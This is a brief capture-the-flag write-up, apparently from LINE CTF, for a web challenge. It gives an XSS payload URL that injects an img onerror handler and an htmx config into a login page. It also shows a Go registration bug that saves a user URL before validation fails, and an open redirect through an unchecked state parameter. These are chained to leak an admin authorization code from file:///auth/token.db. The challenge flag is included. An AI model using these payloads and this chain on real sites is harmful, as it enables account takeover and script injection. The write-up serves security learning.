# Bugs

## Bug 1 - XSS on external/internal

```
http://35.200.122.11:20000/login?timeout={%22indicatorClass%22:%22%3C/style%3E%3Cimg%20src=1%20onerror=alert(1)%3E%3Cstyle%3Ess%22}%27%20x=%27&return_url=invalidscheme://11%27%20content=%27hehehe%27%20http-equiv=%27asdf%27%20name=%27htmx-config
```

## Bug 2 - Store a malicious URL before returning with an error

```go
err := s.ValidationRegistRequest(w, r)
    s.UserStore.CreateUser(
        utils.GenUserID(),
        r.Form.Get("username"),
        r.Form.Get("password"),
        r.Form.Get("url"),
        false,
    )
    if err != nil {
        errors.ReturnError(w, err, errors.Descriptions[err])
        return nil
    }
```

## Bug 3 - Invalid state check (Open Redirect)

```
/api/auth/callback?code=NJU5NWI1MJQTMZHLNC0ZNDCWLWJKM2MTNGJIYJBLMWFIZJE4&state=eyJyZWRpcmVjdCI6ICJodHRwczovL25ta2xpbG0ucmVxdWVzdC5kcmVhbWhhY2suZ2FtZXMvZXh0ZXJuYWwifQ==

```

# Exploit

We can leak the admin's authorization code, which hasn't been used yet, by using bug 2 and setting a URL to `file:///auth/token.db`. After getting a code, we can make a bot login with an admin account, and then redirect (bug 3) to the internal page that has an XSS payload (bug 1).


**Flag: `LINECTF{f133d5cb85ececf2db78d1aef9d526fd}`**
